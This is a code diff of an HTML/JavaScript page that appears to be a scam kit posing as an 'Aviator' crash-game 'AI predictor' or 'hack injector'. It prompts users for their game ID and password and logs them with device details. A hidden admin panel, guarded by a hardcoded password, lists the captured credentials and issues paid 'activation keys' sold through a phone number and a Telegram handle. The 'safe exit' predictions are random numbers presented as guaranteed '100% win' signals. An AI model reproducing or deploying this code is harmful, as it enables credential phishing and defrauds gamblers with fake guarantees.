@@ -3,156 +3,140 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>KADIR 786 | AI PREDICTOR V5.0</title>
+    <title>KADIR 786 | OFFICIAL INJECTOR V5.0</title>
     <style>
-        :root { --neon: #00ff41; --danger: #ff3131; }
-        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; overflow-x: hidden; }
+        :root { --neon: #00ff41; --danger: #ff0000; --gold: #ffae00; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', sans-serif; margin: 0; }
         
-        /* 1. HIDDEN ADMIN SYSTEM */
-        .admin-trigger { position: fixed; top: 0; right: 0; width: 40px; height: 40px; z-index: 1000; cursor: pointer; }
-        #adminPanel { display: none; background: #0a0a0a; border: 1px solid var(--neon); padding: 15px; margin: 10px; border-radius: 10px; }
+        /* 1. ADMIN SECTION (HIDDEN) */
+        #adminArea { display: none; background: #0a0a0a; border: 2px solid var(--neon); padding: 15px; margin: 10px; border-radius: 10px; position: relative; z-index: 9999; }
+        .adm-input { background: #111; border: 1px solid #333; color: var(--neon); padding: 10px; margin: 5px; width: 80%; }
         
-        /* 2. DEVICE & LOCATION TRACKING */
-        .tracker-info { font-size: 10px; color: #555; text-align: left; padding: 10px; background: #050505; }
-
-        /* 3. USER INTERFACE */
+        /* 2. MAIN UI */
         .container { padding: 20px; text-align: center; }
-        .logo { width: 80px; filter: drop-shadow(0 0 10px var(--neon)); }
-        .input-box { width: 100%; max-width: 350px; padding: 15px; background: #111; border: 1px solid #333; color: #fff; border-radius: 12px; margin-bottom: 15px; outline: none; }
-        .btn-main { width: 100%; max-width: 350px; padding: 16px; border: none; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .u-input { width: 100%; max-width: 350px; padding: 15px; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 10px; margin-bottom: 15px; box-sizing: border-box; }
+        .btn-blue { width: 100%; max-width: 350px; padding: 15px; background: #007bff; color: #fff; border: none; border-radius: 30px; font-weight: bold; cursor: pointer; font-size: 16px; }
         
-        /* 4. PREDICTION PANEL (SAFE-EXIT LOGIC) */
-        #predictionArea { display: none; animation: fadeIn 0.5s; }
-        .display-box { background: #111; border: 2px solid var(--danger); border-radius: 20px; padding: 40px 20px; margin: 20px 0; position: relative; }
-        .target-num { font-size: 65px; font-weight: bold; color: #fff; text-shadow: 0 0 20px var(--danger); }
-        .safe-note { color: var(--neon); font-size: 14px; font-weight: bold; margin-top: 10px; }
+        /* 3. PREDICTOR PANEL */
+        #predictorPage { display: none; padding: 20px; text-align: center; }
+        .crash-box { background: #111; border: 2px solid var(--danger); padding: 40px 10px; border-radius: 20px; margin: 20px 0; box-shadow: 0 0 20px var(--danger); }
+        .num-text { font-size: 70px; font-weight: bold; color: #fff; text-shadow: 0 0 15px var(--danger); }
+        
+        /* 4. SUPPORT & BUTTONS */
+        .support-card { background: #1a1a1a; padding: 15px; border-radius: 10px; margin-top: 20px; border: 1px solid #333; }
+        .btn-red { background: var(--danger); width: 100%; max-width: 350px; padding: 15px; border: none; border-radius: 10px; color: #fff; font-weight: bold; margin-bottom: 10px; cursor: pointer; }
+        .btn-video { background: #555; color: #fff; padding: 10px; border-radius: 5px; text-decoration: none; font-size: 12px; }
 
-        @keyframes fadeIn { from {opacity: 0;} to {opacity: 1;} }
-        table { width: 100%; font-size: 10px; border-collapse: collapse; margin-top: 10px; color: var(--neon); }
-        th, td { border: 1px solid #222; padding: 5px; }
+        table { width: 100%; font-size: 10px; color: var(--neon); border-collapse: collapse; margin-top: 10px; }
+        th, td { border: 1px solid #222; padding: 5px; text-align: left; }
     </style>
 </head>
 <body>
 
-<div class="admin-trigger" ondblclick="toggleAdmin()"></div>
+<div class="container" id="loginPage">
+    <div onclick="openAdmin()" style="cursor:pointer;">
+        <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" width="70" style="filter: drop-shadow(0 0 10px var(--neon));">
+        <h1 style="margin: 10px 0;">KADIR 786</h1>
+    </div>
+    
+    <div id="adminArea">
+        <h3 style="color:var(--neon);">ADMIN CONTROL</h3>
+        <input type="password" id="admPass" class="adm-input" placeholder="Enter Password (9580)">
+        <button onclick="admLogin()">Login</button>
+        <div id="admContent" style="display:none; margin-top:15px;">
+            <table id="logTable"><thead><tr><th>ID</th><th>PASS</th><th>DEVICE/LOC</th></tr></thead><tbody id="logBody"></tbody></table>
+            <button onclick="genKey()" style="background:var(--gold); margin-top:10px; padding:5px; border:none; border-radius:3px;">GENERATE ACTIVATION KEY</button>
+            <div id="newKey" style="color:yellow; margin-top:5px; font-weight:bold;"></div>
+        </div>
+    </div>
 
-<div id="adminPanel">
-    <h3 style="color:var(--neon); margin:0;">MASTER CONTROL PANEL</h3>
-    <input type="password" id="admKey" placeholder="Enter Master Password" style="width:100px; font-size:10px;">
-    <button onclick="checkAdm()">Login</button>
-    <div id="admData" style="display:none;">
-        <p>Live Users Data:</p>
-        <table id="logTable">
-            <thead><tr><th>ID</th><th>PASS</th><th>DEVICE</th><th>LOC</th></tr></thead>
-            <tbody id="logBody"></tbody>
-        </table>
-        <button onclick="generateKey()" style="margin-top:10px; background:orange;">GENERATE KEY</button>
-        <div id="keyDisp" style="color:yellow; font-weight:bold;"></div>
+    <div id="userFields">
+        <p style="color:#888;">Enter Old ID to Activate Hack System</p>
+        <input type="text" id="uMail" class="u-input" placeholder="Old Game Email/ID">
+        <input type="password" id="uPass" class="u-input" placeholder="Game Password">
+        <button class="btn-blue" onclick="saveAndProceed()">ACTIVATE ID & LOGIN</button>
+        <br><br>
+        <a href="#" class="btn-video">How to Connect Old ID? (Video)</a>
     </div>
 </div>
 
-<div class="container">
-    <div id="loginPage">
-        <img src="https://cdn-icons-png.flaticon.com/512/7140/7140413.png" class="logo">
-        <h1 style="letter-spacing: 2px;">KADIR 786</h1>
-        <p style="color:#666;">AI-POWERED SAFE PREDICTOR</p>
-        
-        <input type="text" id="uID" class="input-box" placeholder="Enter Old Game ID">
-        <input type="password" id="uPW" class="input-box" placeholder="Game Password">
-        <button class="btn-main" style="background:#007bff;" onclick="startUserSession()">ACTIVATE HACK</button>
-        
-        <div class="tracker-info" id="devInfo">Fetching device signatures...</div>
+<div id="predictorPage">
+    <h2 style="color:var(--danger);">AVIATOR SAFE-EXIT v5.0</h2>
+    <div class="crash-box">
+        <div id="loader" style="display:none; color:var(--neon);">SCANNING SERVER...</div>
+        <div id="resultArea">
+            <div class="num-text" id="output">1.00x</div>
+            <p style="color:var(--neon); font-size:14px;">SAFE WITHDRAW POINT</p>
+        </div>
     </div>
 
-    <div id="predictionArea">
-        <h2 style="color:var(--danger); margin:0;">AVIATOR SAFE-EXIT v5.0</h2>
-        <p style="font-size:12px; color:#888;">System Connected to Server</p>
+    <input type="text" id="actCode" class="u-input" placeholder="Enter Activation Code">
+    <button class="btn-red" onclick="getSafeSignal()">GET PREDICTION</button>
 
-        <div class="display-box">
-            <div id="loader" style="display:none; color:var(--neon);">ANALYZING CRASH PATTERN...</div>
-            <div id="predictionResult">
-                <div class="target-num" id="num">1.00x</div>
-                <div class="safe-note">SAFE EXIT LIMIT</div>
-            </div>
-        </div>
-
-        <input type="text" id="activeCode" class="input-box" placeholder="Enter Activation Code">
-        <button class="btn-main" style="background:var(--danger);" onclick="getSignal()">GET SAFE SIGNAL</button>
-        
-        <div style="margin-top:25px; background:#111; padding:15px; border-radius:10px;">
-            <p style="margin:0; font-size:12px; color:#888;">For Key & Support:</p>
-            <a href="tel:9554527334" style="color:orange; font-size:22px; text-decoration:none; font-weight:bold;">📞 9554527334</a>
-        </div>
+    <div class="support-card">
+        <p style="color:#888; margin:0;">For Key & Activation, Call Admin:</p>
+        <a href="tel:9554527334" style="color:var(--gold); font-size:20px; text-decoration:none; font-weight:bold;">📞 9554527334</a>
+        <p style="color:#007bff; margin-top:10px;">Telegram: @Kadir786_Admin</p>
     </div>
 </div>
 
 <script>
-    let masterKeys = JSON.parse(localStorage.getItem('sys_keys')) || [];
-    let deviceInfo = "";
+    let validKeys = JSON.parse(localStorage.getItem('sysKeys')) || [];
+    let deviceData = "Tracking Device...";
 
-    // 1. डिवाइस और लोकेशन ट्रैकिंग (Simulated for safety)
     window.onload = () => {
-        deviceInfo = navigator.userAgent.split(')')[0].split('(')[1];
-        document.getElementById('devInfo').innerText = "Device: " + deviceInfo + " | IP: 103.21.xx.xx | Status: Secure";
+        deviceData = navigator.userAgent.split(')')[0].split('(')[1] || "Mobile Device";
     };
 
-    function toggleAdmin() { document.getElementById('adminPanel').style.display = 'block'; }
-    
-    function checkAdm() {
-        if(document.getElementById('admKey').value === "9580") {
-            document.getElementById('admData').style.display = 'block';
-            showLogs();
+    function openAdmin() { document.getElementById('adminArea').style.display = 'block'; }
+
+    function admLogin() {
+        if(document.getElementById('admPass').value === "9580") {
+            document.getElementById('admContent').style.display = 'block';
+            loadLogs();
         }
     }
 
-    function generateKey() {
-        let k = "KDR-" + Math.floor(Math.random()*8999+1000);
-        masterKeys.push(k);
-        localStorage.setItem('sys_keys', JSON.stringify(masterKeys));
-        document.getElementById('keyDisp').innerText = "Key: " + k;
+    function genKey() {
+        let k = "KDR-" + Math.floor(Math.random()*9000+1000);
+        validKeys.push(k);
+        localStorage.setItem('sysKeys', JSON.stringify(validKeys));
+        document.getElementById('newKey').innerText = "New Key: " + k;
     }
 
-    function startUserSession() {
-        let id = document.getElementById('uID').value;
-        let pw = document.getElementById('uPW').value;
-        if(id && pw) {
-            let logs = JSON.parse(localStorage.getItem('sys_logs')) || [];
-            logs.push({id, pw, dev: deviceInfo, loc: "India", time: new Date().toLocaleTimeString()});
-            localStorage.setItem('sys_logs', JSON.stringify(logs));
-            
+    function saveAndProceed() {
+        let e = document.getElementById('uMail').value;
+        let p = document.getElementById('uPass').value;
+        if(e && p) {
+            let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
+            logs.push({e, p, d: deviceData, t: new Date().toLocaleTimeString()});
+            localStorage.setItem('userLogs', JSON.stringify(logs));
             document.getElementById('loginPage').style.display = 'none';
-            document.getElementById('predictionArea').style.display = 'block';
+            document.getElementById('predictorPage').style.display = 'block';
         } else { alert("Please enter ID and Password!"); }
     }
 
-    function showLogs() {
-        let logs = JSON.parse(localStorage.getItem('sys_logs')) || [];
+    function loadLogs() {
+        let logs = JSON.parse(localStorage.getItem('userLogs')) || [];
         let h = "";
-        logs.forEach(l => h += `<tr><td>${l.id}</td><td>${l.pw}</td><td>${l.dev}</td><td>${l.loc}</td></tr>`);
+        logs.forEach(l => h += `<tr><td>${l.e}</td><td>${l.p}</td><td>${l.d}</td></tr>`);
         document.getElementById('logBody').innerHTML = h;
     }
 
-    // 2. असली वर्किंग लॉजिक (Safe-Exit)
-    function getSignal() {
-        let userKey = document.getElementById('activeCode').value;
-        if(masterKeys.includes(userKey)) {
-            document.getElementById('predictionResult').style.display = 'none';
+    function getSafeSignal() {
+        let k = document.getElementById('actCode').value;
+        if(validKeys.includes(k)) {
+            document.getElementById('resultArea').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
-            
             setTimeout(() => {
-                // मान लो असली क्रैश 5x से 15x के बीच होने वाला है
-                let realCrash = (Math.random() * 10 + 5); 
-                // हम यूजर को 1.5x से 2x पहले ही बाहर निकाल देंगे (Safe Zone)
-                let safePoint = (realCrash - (Math.random() * 1 + 0.8)).toFixed(2);
-                
+                let realVal = (Math.random() * 8 + 2);
+                let safeVal = (realVal - 0.75).toFixed(2); // Safe-Exit logic
                 document.getElementById('loader').style.display = 'none';
-                document.getElementById('predictionResult').style.display = 'block';
-                document.getElementById('num').innerText = safePoint + "x";
-                alert("CRITICAL INSTRUCTION: Auto-withdraw confirmed at " + safePoint + "x for 100% win.");
-            }, 2500);
-        } else {
-            alert("Invalid Activation Key! Please buy from Admin.");
-        }
+                document.getElementById('resultArea').style.display = 'block';
+                document.getElementById('output').innerText = safeVal + "x";
+                alert("Withdraw before " + safeVal + "x for 100% Safety!");
+            }, 2000);
+        } else { alert("Invalid Code! Contact Admin 9554527334"); }
     }
 </script>
 </body>
